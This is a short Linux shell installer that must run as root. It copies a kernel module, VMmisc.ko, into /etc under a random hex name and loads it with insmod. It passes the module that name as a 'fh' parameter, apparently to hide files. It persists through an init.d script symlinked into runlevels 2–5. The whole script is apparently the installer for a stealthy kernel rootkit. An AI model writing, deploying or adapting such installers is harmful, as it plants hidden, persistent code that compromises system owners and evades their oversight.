#!/bin/sh
###
###

echo -e "Installing\n"

if [ `whoami` != "root" ]; then
   echo -e "\n[E] must be root"
   exit 1
fi

echo ""
#--------------------------------------------------------------------
Pwd_Dir=$(pwd)
Rand=$(cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

hide_tag=$Rand

src_ko=VMmisc.ko
# xxx, "/etc/"
dst_ko=/etc/$hide_tag

start_path=/etc/init.d/$hide_tag



cat > $Pwd_Dir/tmp1 <<EOF
#!/bin/sh
#
case "\$1" in
'start')
	/sbin/insmod ${dst_ko} fh="${hide_tag}"
	;;
'stop')

	;;
esac

exit 0

EOF


_install1 () {

	cp $Pwd_Dir/tmp1 $start_path

	chmod +x $start_path
	
	cp $Pwd_Dir/$src_ko $dst_ko
	
	ln -sf $start_path /etc/rc2.d/S55$hide_tag
	ln -sf $start_path /etc/rc3.d/S55$hide_tag
	ln -sf $start_path /etc/rc4.d/S55$hide_tag
	ln -sf $start_path /etc/rc5.d/S55$hide_tag

	
	if [ -x /etc/init.d/$hide_tag ]; then
		/etc/init.d/$hide_tag start
		
		echo " >> ko path: "$dst_ko
		echo " >> start path: "${start_path}""
		
		echo -e "    --- ok ---    \n"
	fi

	exit 0;
}

if [ -x /etc/init.d/ ]; then
   _install1
fi
   

exit 0

